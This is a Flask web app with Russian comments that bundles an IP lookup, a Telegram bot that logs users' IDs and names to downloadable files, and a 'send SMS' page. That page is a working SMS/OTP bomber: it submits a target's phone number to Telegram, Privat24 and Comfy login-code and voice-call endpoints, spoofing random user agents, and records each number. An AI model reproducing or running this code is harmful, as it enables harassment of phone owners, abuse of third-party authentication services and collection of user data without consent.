from flask import Flask, render_template, request, send_from_directory
import requests
import threading
import time
import telebot
import os
import fake_useragent
from datetime import datetime

app = Flask(__name__)

# Папка для базы данных
DATA_FOLDER = "data"
if not os.path.exists(DATA_FOLDER):
    os.makedirs(DATA_FOLDER)

# Поиск по IP
def get_ip_info(ip_address):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip_address}")
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"Ошибка при запросе к API: {e}")
        return None

@app.route('/ip_lookup', methods=['GET', 'POST'])
def ip_lookup():
    ip_info = None
    if request.method == 'POST':
        ip_address = request.form['ip_address']
        ip_info = get_ip_info(ip_address)
    return render_template('ip_lookup.html', ip_info=ip_info)

# Запуск Телеграм-бота
def run_telegram_bot(token):
    bot = telebot.TeleBot(token)

    @bot.message_handler(commands=['start'])
    def start(message):
        user_id = str(message.from_user.id)
        username = message.from_user.username or "none"
        full_name = message.from_user.full_name or "none"
        current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        current_year = datetime.now().year  # Текущий год

        # Формируем имя файла
        file_name = f"users_data_{current_year}.txt"
        file_path = os.path.join(DATA_FOLDER, file_name)

        # Проверяем, существует ли файл, если нет — создаем его с заголовками
        if not os.path.exists(file_path):
            with open(file_path, "w", encoding="utf-8") as file:
                file.write('"ID","Username","Name","Time"\n')

        # Записываем данные пользователя
        with open(file_path, "a", encoding="utf-8") as file:
            file.write(f'"{user_id}","{username}","{full_name}","{current_time}"\n')

        bot.send_message(message.chat.id, "Бот в разработке")

    bot.polling(none_stop=True)

@app.route('/start_bot', methods=['GET', 'POST'])
def start_bot():
    if request.method == 'POST':
        token = request.form['token']
        if token:
            threading.Thread(target=run_telegram_bot, args=(token,), daemon=True).start()
            return render_template('start_bot.html', success="Бот успешно запущен!")
    files = os.listdir(DATA_FOLDER)  # Получаем список файлов в папке `data`
    return render_template('start_bot.html', files=files)

# Отправка СМС
@app.route('/send_sms', methods=['GET', 'POST'])
def send_sms():
    if request.method == 'POST':
        number = request.form['number']
        try:
            user_agent = fake_useragent.UserAgent().random
            headers = {'User-Agent': user_agent}

            requests.post(
                'https://my.telegram.org/auth/send_password',
                headers=headers,
                data={'phone': '+' + number}
            )
            requests.post(
                'https://www.privat24.ua/http',
                headers=headers,
                json={
                    'action': "submit",
                    'cmd': "show_login_form",
                    'login': "+" + number
                }
            )
            requests.post(
                'https://comfy.ua/api/auth/v3/otp/send',
                headers=headers,
                json={'phone': number}
            )
            requests.post(
                'https://comfy.ua/api/auth/v3/ivr/send',
                headers=headers,
                json={'phone': number}
            )
        except Exception as e:
            print(f"Ошибка при отправке СМС: {e}")

        # Записываем номер в файл с годом
        current_year = datetime.now().year  # Текущий год
        file_name = f"user_data_{current_year}.txt"
        file_path = os.path.join(DATA_FOLDER, file_name)
        with open(file_path, "a", encoding="utf-8") as file:
            file.write(f"Номер: {number}\n")

        return render_template('send_sms.html', success="СМС успешно отправлено!")
    files = os.listdir(DATA_FOLDER)  # Получаем список файлов для страницы
    return render_template('send_sms.html', files=files)

# Скачивание базы данных
@app.route('/download/<filename>')
def download_file(filename):
    return send_from_directory(DATA_FOLDER, filename, as_attachment=True)

# Главная страница
@app.route('/')
def index():
    files = os.listdir(DATA_FOLDER)
    return render_template('index.html', files=files)

# Описание сайта
@app.route('/description')
def description():
    return render_template('description.html')

if __name__ == "__main__":
    app.run(debug=True)